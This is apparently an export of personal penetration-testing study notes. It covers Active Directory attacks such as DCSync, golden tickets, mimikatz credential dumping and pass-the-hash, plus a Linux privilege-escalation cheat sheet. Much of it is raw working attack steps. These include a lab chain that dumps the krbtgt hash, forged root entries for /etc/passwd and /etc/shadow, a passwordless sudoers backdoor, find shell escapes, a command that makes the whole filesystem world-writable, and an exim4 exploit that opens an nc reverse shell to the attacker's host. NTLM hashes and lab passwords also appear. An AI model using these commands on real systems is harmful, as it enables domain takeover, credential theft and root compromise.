class='title level-4'>DC Sync</h1><br/>In a domain with mutliple domain controllers, there are constant queries via the IDL_DRSGetNCChanges API to keep all of th domain controllers on the same page and updated. When this API is used to query an account, the machine does not need to be verified to be a DC, only the SID needs to have the appropriate privileges. In short, a domain admin will be able to query the DC directly, aquiring the NTLM hash of user on the domain. </div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>We are going to log into Bossman as tire and ask for a DCSync for the Tripp account. Then take that hash and dump the password.<br /><a href=""><img src="images/1837-1.png" alt="images/1837-1.png" /></a><br /><a href=""><img src="images/1837-2.png" alt="images/1837-2.png" /></a></div><div class='page'><h1 class='title level-4'>Golden Ticket</h1><br/>Remember! When a user logs in, they are submitting a request for a TGT. When the user recieves the TGT it is incrypted with the hash of the password for the krbtgt account. If we are able to get our hands on that password hash, we will be able to create our own TGT&#39;s, for users that exist or don&#39;t exist, and give them whatever privileges we desire!<br />The loss of the krbtgt hash is particularly devistating becasue there is no built in way to change the the krbtgt password. It can not be done without substancial downtime of the entire domain.</div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>We are going to log onto the dc and aquire the hash of the KRBTGT. We will then use that hash to create a “golden ticket” on bossman and psexec into the DC with only a user account.<br /><a href=""><img src="images/1839-1.png" alt="images/1839-1.png" /></a><br />301f73ccb16c24dddc2bd3a3dff7aa43<br /><br />This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br />First we get the domain SID (all but the last tach and four charchters), then demonstrate that we do not have the ability to psexec to DC01.<br /><a href=""><img src="images/1839-2.png" alt="images/1839-2.png" /></a><br />Useing mimikatz we create a golden ticket and use the /ptt argument to put it in memory.<br /><a href=""><img src="images/1839-3.png" alt="images/1839-3.png" /></a><br />In a new shell we attempt to psexec to DC01 again, only this time with success!<br /><a href=""><img src="images/1839-4.png" alt="images/1839-4.png" /></a><br /><br />Note - If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows. <br /><br /><a href=""><img src="images/1839-5.png" alt="images/1839-5.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Others</h1><br/>Grab the NTDS.dit file - A copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.<br />Run mimikatz on the DC dumping the hash of every account.<br />Skeleton keys aren&#39;t technically persistance, but they are pretty neat, allowing you to make a second password for an account with out effecting the original. Skeleton keys only run in memory, therfor a reboot of the machine would remove the skeleton key. </div><div class='page'><h1 class='title level-3'>Exercise answers</h1><br/></div><div class='page'><h1 class='title level-4'>Net.exe</h1><br/></div><div class='page'><h1 class='title level-5'>1. Domain users</h1><br/><a href=""><img src="images/1843-1.png" alt="images/1843-1.png" /></a></div><div class='page'><h1 class='title level-5'>2. Domain admins</h1><br/><a href=""><img src="images/1844-1.png" alt="images/1844-1.png" /></a></div><div class='page'><h1 class='title level-4'>Powershell</h1><br/></div><div class='page'><h1 class='title level-5'>1. Nesting</h1><br/><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(ObjectClass=*)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()<br />foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;if&nbsp;($obj.properties.name&nbsp;-like&nbsp;&#39;*marforcyber*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$root&nbsp;=&nbsp;$obj<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$grouplist&nbsp;=&nbsp;@(&#39;root&nbsp;&#39;+$root.properties.name)}}<br />$memberofcount&nbsp;=&nbsp;1<br />while&nbsp;($memberofcount&nbsp;-ge&nbsp;1){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.properties.memberof&nbsp;-like&nbsp;$root.properties.distinguishedname){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.Properties.samaccounttype&nbsp;-like&nbsp;&#39;*268435456*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$grouplist&nbsp;+=&nbsp;&#39;nested&nbsp;group&nbsp;of&nbsp;&#39;+&nbsp;$obj.Properties.memberof&nbsp;+&nbsp;&#39;&nbsp;=&nbsp;&#39;&nbsp;+&nbsp;$obj.Properties.name}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{$grouplist&nbsp;+=&nbsp;&#39;nested&nbsp;user&nbsp;of&nbsp;&#39;+&nbsp;$obj.Properties.memberof&nbsp;+&nbsp;&#39;&nbsp;=&nbsp;&#39;&nbsp;+&nbsp;$obj.Properties.name}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$memberofcount&nbsp;=&nbsp;$obj.Properties.member.Count<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$root&nbsp;=&nbsp;$obj<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break}}}<br />$grouplist<br /></div></div><br /><a href=""><img src="images/1846-1.png" alt="images/1846-1.png" /></a><br />...or a better way done with the active directory module  (the script can be found on DC01).<br /><a href=""><img src="images/1846-2.png" alt="images/1846-2.png" /></a><br /><a href="https://gallery.technet.microsoft.com/scriptcenter/Get-nested-group-15f725f2">https://gallery.technet.microsoft.com/scriptcenter/Get-nested-group-15f725f2</a><br /><br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(ObjectClass=user)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()<br />foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.Properties.userprincipalname&nbsp;-like&nbsp;&#39;*kvothe*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$obj.Properties.manager<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br /></div></div><br /><a href=""><img src="images/1846-3.png" alt="images/1846-3.png" /></a></div><div class='page'><h1 class='title level-5'>asdf</h1><br/></div><div class='page'><h1 class='title level-5'>ATME</h1><br/></div><div class='page'><h1 class='title level-5'>ATME</h1><br/></div><div class='page'><h1 class='title level-5'>2. Kvothe's Manager</h1><br/></div><div class='page'><h1 class='title level-4'>Get-Netsession</h1><br/><a href=""><img src="images/1851-1.png" alt="images/1851-1.png" /></a><br /><br /><br />Trick question! I have no idea! In the example above, I am logged in as tire (domain admin) and I am able to see more from squid (domain user) who is running in a shell via the runas command.</div><div class='page'><h1 class='title level-4'>Service Principal Names</h1><br/><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;serviceprincipalname=*&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){$obj.Properties.serviceprincipalname}</div></div><br /><a href=""><img src="images/1852-1.png" alt="images/1852-1.png" /></a></div><div class='page'><h1 class='title level-3'>Lab</h1><br/>GOAL=Get the NTLM hash of krbtgt while starting with only squid:yeetcannon<br /><br />nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;yee.wtf&#39;,userdb=/opt/wordlists/names.txt 192.168.40.128<br />GetUserSPNs.py -request yee.wtf/squid<br />copy paste ticket -&gt; krb5tgs.out<br />john ./krb5tgs.out<br />rdesktop -u Tripp -d yee.wtf -p Passw0rd 192.168.40.131<br />in elevated command prompt:<br />	net users /domain<br />	net groups /domain <br />	net groups /domain &quot;domain admins&quot;<br />	whoami /groups<br />	whoami /priv<br />	C:\tools\mimikatz.exe<br />	privilege::debug<br />	sekurlsa::logonpasswords<br />	take JBettis NTLM hash 90ce085b7102581debbd0cbe1f3f384b <br />	kerberos::purge<br />	kerberos::list<br />	sekurlsa::pth /user:JBettis /ntlm:90CE085B7102581DEBBD0CBE1F3F384B /domain:yee.wtf<br />	lsadump::dcsync /user:krbtgt<br /><br />Why didn&#39;t I use psexec?????</div><div class='page'><h1 class='title level-4'>Fun psexec nugget</h1><br/>When you spawn a session with psexec.exe (sysinternals tool), that session will run in a medium integrity context. Therefore even if the user has the privilege to write to the ADMIN$ drive of another machine, the token of the proccess the user is running in will not allow it.<br />Psexec.py (Impacket tool) spawns it&#39;s process&#39;s as system (that is becasue it writes to any share it can access, creates a service pointing to the .exe in the share it can write to then executes that service whcih defaults to being run as system). Althought the token is fine, if you would attempt to use psxec.exe (sysinternals tool) from that psexec.py session it would not fail but instead hang. Why? Becasue psexec.py communicates back via a TCP port where as psexec.exe communicates via named pipes and there is some kind of misshap with the stdin,out,err relationship. <br /></div><div class='page'><h1 class='title level-2'>Linux PrivEsc</h1><br/>▸ <a href="PrivEsc--Linux_PrivEsc.html">Linux PrivEsc</a><br />	▸ <a href="PrivEsc--Linux_PrivEsc--Order_of_Operations.html">Order of Operations</a><br />	▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff.html">Extra</a><br />		▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--Common_Situations.html">Common Situations</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--Common_Situations--One_root_Command,_no_new_shell.html">One root Command, no new shell</a><br />		▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs.html">One-Offs</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs---etc-passwd.html">/etc/passwd</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs---etc-shadow.html">/etc/shadow</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs---usr-bin-find.html">/usr/bin/find</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--chkrootkit.html">chkrootkit</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--echo.html">echo</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--exim4.html">exim4</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--ht.html">ht</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--ifcfg_ifup.html">ifcfg ifup</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--PATH_Variable.html">PATH Variable</a><br />			▸ <a href="PrivEsc--Linux_PrivEsc--Extra_Stuff--One-Offs--screen.html">screen</a></div><div class='page'><h1 class='title level-3'>Order of Operations</h1><br/>poke around (home dirs and whatnot)<br />locate *.conf* | grep &quot;www&quot; | more<br />ls /etc/apache2/sites-available<br />ls /opt/<br />-------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />sudo -l &lt;&lt;&lt;that is an L         &lt;&lt;&lt;if it is a OpenBSD machine cat /etc/doas.conf<br />sudo su<br />su -l otherusercreds<br />---------------------------------------------------------------------------------------------------------------------------------------------------------------<br />Look for files with setuid bit set<br />find / -perm -4000 2&gt;/dev/null | xargs ls -lah              &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;if a result has a version in the name GIVE IT A LOOKSEE!!<br />find / -perm -u=s -type f 2&gt;/dev/null | xargs ls -lah                              way to much shit returned &gt; find / -perm -2000 2&gt;/dev/null | xargs ls -lah<br />ls -la through files and attempt to execute<br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />uname -a (hit up in searchsploit)<br />look for build version       cat /etc/*-release<br />                                      cat /etc/issue<br />                                      cat /proc/version<br />                                      cat /etc/*{release,issue,edition,version}* 2&gt; /dev/null<br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />cat /etc/crontab<br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />netstat -natup                  looking for possible backend machines OR an internal server<br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />look in web config files for mysql credentials<br />    wordpress = /var/www/wordpress/wp-config.php<br />    drupal        = something /settings.php<br />    nostromo    = /var/nostromo/conf<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------<br />grep -ir user | grep -i pass<br />grep -ir user | grep -i pwd<br />grep -C2  -r root 2&gt; /dev/null | grep pass<br />grep -C2  -r username 2&gt; /dev/null | grep pass<br />find ./ -type f -writable                                           &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;see what files and folders you can write to recursivley<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------<br />wget --recursive --no-parent <a href="http://192.168.11.252:80/TFPE">http://192.168.11.252:80/TFPE</a> &amp;&amp; chmod 777 *<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------<br />linux-smart-enumerate<br />cp <a href="file:///root/Desktop/Tools/PrivEsc/linux-smart-enumeration/lse.sh">/root/Desktop/Tools/PrivEsc/linux-smart-enumeration/lse.sh</a> .<br />./lse.sh -l1<br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />linux-exploit-suggester<br /><br />dpkg -l &gt; dpkg.txt<br />or<br />rpm -l &gt; rpm.txt<br />./les.sh --pkglist-file dpkg.txt --userspace-only<br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />pspy<br />SYNTAX UNTESTED<br />pspy32 or pspy64<br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------<br />stings on custom binaries<br /><br /><br /></div><div class='page'><h1 class='title level-3'>Extra Stuff</h1><br/></div><div class='page'><h1 class='title level-4'>Common Situations</h1><br/></div><div class='page'><h1 class='title level-5'>One root Command, no new shell</h1><br/>echo &quot;username  ALL=(ALL) NOPASSWD:ALL&quot; | sudo tee /etc/sudoers.d/username<br />sudo bash</div><div class='page'><h1 class='title level-4'>One-Offs</h1><br/><br /></div><div class='page'><h1 class='title level-5'>/etc/passwd</h1><br/>Can you write to /etc/passwd?<br /><br />openssl passwd --help<br />openssl passwd -1 coolhand<br />$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40<br />vi /etc/passwd<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />:wq!<br /><br />ssh root@10.10.10.29<br />password: coolhand<br /><br /><br />root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</div><div class='page'><h1 class='title level-5'>/etc/shadow</h1><br/>openssl passwd -1 -salt root coolhand<br />    $1$root$QLjiLXyqZyG8UZoetHo2t1<br />add root: to the begining and :17764:0:99999:7::: to the end so it looks like this<br /><br />root:$1$root$QLjiLXyqZyG8UZoetHo2t1:17764:0:99999:7:::<br />make this a line in /etc/shadow and boom!<br />su root<br />        <br />        <br />        <br />If you are prompted for a password, its coolhand</div><div class='page'><h1 class='title level-5'>/usr/bin/find</h1><br/>find /etc/shadow -exec cat {} +                    now you can read the shadow file!<br /><br />find /etc/shadow -exec bash \;                      you may be able to make a root shell with this or sh!<br />find /etc/shadow -exec sh \;    </div><div class='page'><h1 class='title level-5'>chkrootkit</h1><br/>chkrootkit          is it version 0.49? (check the README in /etc)<br /><br /><br />searchsploit will tell you all the things<br />in summary<br />    go to /tmp<br />    echo &quot;chmod -R 777 /&quot; &gt; update<br />    execute chkrootkit (whether it be a cron job or ran during the README)<br />    Once it runs the whole file structure should be 777&#39;d</div><div class='page'><h1 class='title level-5'>echo</h1><br/>if you can run echo, you can get a shell<br /><br />echo os.system(&quot;/bin/bash&quot;)</div><div class='page'><h1 class='title level-5'>exim4</h1><br/>Now I run lse.sh and find that the machine is running exim4<br />exim4 --version shows version 4.87<br />exploitdb takes us to <a href="https://www.exploit-db.com/exploits/46996">https://www.exploit-db.com/exploits/46996</a><br />run dos2unix against the code to “unwindowsify” it<br />put 46996.sh on target box<br /><br />start nc listener<br />/bin/bash 46996.sh -m netcat<br />it will say to wait 5 seconds... and then you get to put in a command<br />you put in nc -e /bin/bash 192.168.11.136 3234          (that is your kali IP)<br />and boom!! root shell!</div><div class='page'><h1 class='title level-5'>ht</h1><br/>sudo /usr/local/bin/ht /etc/passwd<br />f6 &gt; text &gt; f3 &gt; down down select <br />comment out root<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />f2 (to save)<br />ctrl c<br />cat /etc/passwd<br />su -l root<br />coolhand<br />whoami<br />    root!!</div><div class='page'><h1 class='title level-5'>ifcfg ifup</h1><br/>if a config runs letting you change either of these simply answer<br />bullshit /bin/bash -i<br />bullshit<br />bullshit<br />bullshit<br /><br /><br />you are now root!<br /><br /><a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></div><div class='page'><h1 class='title level-5'>PATH Variable</h1><br/><a href=""><img src="images/1607-1.png" alt="images/1607-1.png" /></a><br /><a href=""><img src="images/1607-2.png" alt="images/1607-2.png" /></a><br /><br />script is opviously the binary for ls. It aslo has the SUID bit set to run as root.<br /><br />cd /tmp<br />echo &quot;echo  &quot;user4 ALL=(ALL) NOPASSWD:ALL&quot; | sudo tee /etc/sudoers.d/user4&#39;<br />export PATH=/tmp:$PATH<br />~/script (or ls)<br />	now we are able to sudo without a password</div><div class='page'><h1 class='title level-5'>screen</h1><br/>Watch HTB Haircut video<br /><br />ran the find privs command and found that a vulnerable version of screen would be run as root<br />found the exploit in searchsploit and downloaded it.<br />compiled the code (on my debian 64 machine). The code between the EOF piecees. <br />I then moved the files over to the targer <br />chmod 777 41154.sh<br />run 41154.sh ....and...BOOM. I should be root... but I am pretty sure I messed one of the /etc/xxx.so files. I am not restarting yeet.</div><div class='page'><h1 class='title level-2'>Windows PrivEsc</h1><br/>▸ <a href="PrivEsc--Windows_PrivEsc.html">Windows PrivEsc</a><br />	▸ <a href="PrivEsc--Windows_PrivEsc--Order_of_Operations.html">Order of Operations</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Order_of_Operations--Manual_Enumeration.html">Manual Enumeration</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Order_of_Operations--Resources.html">Resources</a><br />	▸ <a href="PrivEsc--Windows_PrivEsc--Methods.html">Methods</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels.html">Kernels</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels--ms10-015.html">ms10-015</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels--ms10-059.html">ms10-059</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels--ms15-051.html">ms15-051</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels--ms16-032.html">ms16-032</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels--MS17-010.html">MS17-010</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Kernels--CVE-2018-8120.html">CVE-2018-8120</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Services.html">Services</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Services--Insecure_Service_Properties_(Writeable_BinPath).html">Insecure Service Properties (Writeable BinPath)</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Services--Unquoted_Service_Path_(Search_Order_Hijack).html">Unquoted Service Path (Search Order Hijack)</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Services--Weak_Registry_Permissions_(Overwrite_D-Word).html">Weak Registry Permissions (Overwrite D-Word)</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Services--Insecure_Service_Executables_(Overwrite_.exe).html">Insecure Service Executables (Overwrite .exe)</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Services--DLL_Hijacking.html">DLL Hijacking</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Registry.html">Registry</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Registry--AutoRun_Keys.html">AutoRun Keys</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Registry--AlwaysInstallElivated.html">AlwaysInstallElivated</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Passwords.html">Passwords</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Passwords--Manual_Password_Hunting.html">Manual Password Hunting</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Passwords--SAM_and_SYSTEM.html">SAM and SYSTEM</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Scheduled_Tasks.html">Scheduled Tasks</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Insecure_GUI_Apps.html">Insecure GUI Apps</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Startup_Applications.html">Startup Applications</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Installed_Applications.html">Installed Applications</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Hotpotato.html">Hotpotato</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation.html">Token Impersonation</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation--Rotten_Potato.html">Rotten Potato</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation--Juicy_Potato.html">Juicy Potato</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation--Rogue_Potato.html">Rogue Potato</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation--Print_Spoofer.html">Print Spoofer</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation--msf.html">msf</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Methods--Token_Impersonation--Details.html">Details</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Methods--High_Integrity_admin_to_System.html">High Integrity admin to System</a><br />	▸ <a href="PrivEsc--Windows_PrivEsc--File_Movement.html">File Movement</a><br />	▸ <a href="PrivEsc--Windows_PrivEsc--Got_Creds.html">Got Creds?</a><br />	▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff.html">Extra Stuff</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--AD.html">AD</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--AD--Bloodhound.html">Bloodhound</a><br />				▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--AD--Bloodhound--bloodhound.html">bloodhound</a><br />				▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--AD--Bloodhound--powerview.html">powerview</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--ADS.html">ADS</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Groups.html">Groups</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Groups--azure_admins.html">azure admins</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Groups--dns_admins.html">dns admins</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Locate.html">Locate</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Lock_Workstation.html">Lock Workstation</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--nc_shell_One-liner.html">nc shell One-liner</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Port_Forwarding.html">Port Forwarding</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Firewalls-Anti-Virus.html">Firewalls/Anti-Virus</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Firewalls-Anti-Virus--Real_Time_Protection.html">Real Time Protection</a><br />				▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Firewalls-Anti-Virus--Real_Time_Protection--Folder_Exclusion.html">Folder Exclusion</a><br />			▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Firewalls-Anti-Virus--windows_firewall.html">windows firewall</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Service_Account_Start.html">Service Account Start</a><br />		▸ <a href="PrivEsc--Windows_PrivEsc--Extra_Stuff--Windows_Subsystem_for_Linux_(wsl).html">Windows Subsystem for Linux (wsl)</a></div><div class='page'><h1 class='title level-3'>Order of Operations</h1><br/><div class="codebox"><div class="codebox">whoami&nbsp;&amp;&amp;&nbsp;whoami&nbsp;/groups&nbsp;&amp;&amp;&nbsp;whoami&nbsp;/priv<br 